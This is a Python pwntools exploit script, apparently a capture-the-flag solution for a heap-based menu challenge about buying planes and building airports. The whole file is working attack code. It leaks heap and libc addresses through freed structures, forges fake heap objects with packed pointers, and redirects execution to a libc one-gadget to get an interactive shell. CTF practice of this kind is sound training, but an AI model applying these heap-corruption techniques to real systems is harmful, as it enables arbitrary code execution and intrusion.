#!/usr/bin/env python3
from pwn import *


exe = './chall'
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
    # b* 0x555555400D9F
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

cnt = -1

def buyplane(ind, name):
    ru(b"Your choice: ")
    sl(b"1")
    ru(b"Your choice: ")
    sl(str(ind).encode())
    ru(b"name: ")
    sl(name)


def buildport(size, name):
    ru(b"Your choice: ")
    sl(b"2")
    ru(b"name? ")
    sl(str(size).encode())
    ru(b"name: ")
    sl(name)
    global cnt
    cnt += 1
    return cnt

def listplanes(port):
    ru(b"Your choice: ")
    sl(b"3")
    ru(b"choose? ")
    sl(str(port).encode())
    ru(b"choice: ")
    sl(b"1")
    ru(b"name: ")
    t = rl()
    ru(b"Build by ")
    u = rl()
    ru(b"at: ")
    v = rl()
    print(t)
    sl(b"3")
    return t, u, v

def sellport(port):
    ru(b"Your choice: ")
    sl(b"3")
    ru(b"choose? ")
    sl(str(port).encode())
    ru(b"choice: ")
    sl(b"2")

def fly(plane, port):
    ru(b"choice: ")
    sl(b"4")
    ru(b"choose? ")
    sl(plane)
    ru(b"choice: ")
    sl(b"1")
    ru(b"fly? ")
    sl(str(port).encode())
    sl(b"3")

def sellplane(plane):
    ru(b"choice: ")
    sl(b"4")
    ru(b"choose? ")
    sl(plane)
    ru(b"choice: ")
    sl(b"2")

r = start()

# Stage 1
a = buildport(24, b"AAAA")
b = buildport(24, b"BBBB")

buyplane(13, b"QQQ")
fly(b"QQQ", a)

# Leak heap address
fly(b"QQQ", b)

heap = u64(listplanes(b)[1].strip().ljust(8, b"\x00")) - 160    

# Leak libc address
sellport(a)
libc.address = u64(listplanes(b)[1].strip().ljust(8, b"\x00")) - 3951480
onegadget = libc.address + 0x4526a

log.info(f"heap: {hex(heap)}" )
log.info(f"heap: {hex(libc.address)}" )

# Stage 2

dum = buildport(24, b"dummy")

buyplane(1, b"QQQ")
fly(b"QQQ", dum)
buyplane(2, b"WWW")
buyplane(3, b"EEE")

sellplane(b"WWW")
sellplane(b"EEE")
sellplane(b"QQQ")

l = buildport(0x48, b"AAAAAAAA"*6 + p64(heap+560-56) + p64(heap+544) )
sellport(dum)

buyplane(1, b"bob1")
buyplane(1, b"bob2")

buildport(0x48, b"bob2\x00" + b"\x00"*3 + b"A"*(8*5) + p64(heap)*2 + p64(onegadget))
sellplane(b"bob2")

r.interactive()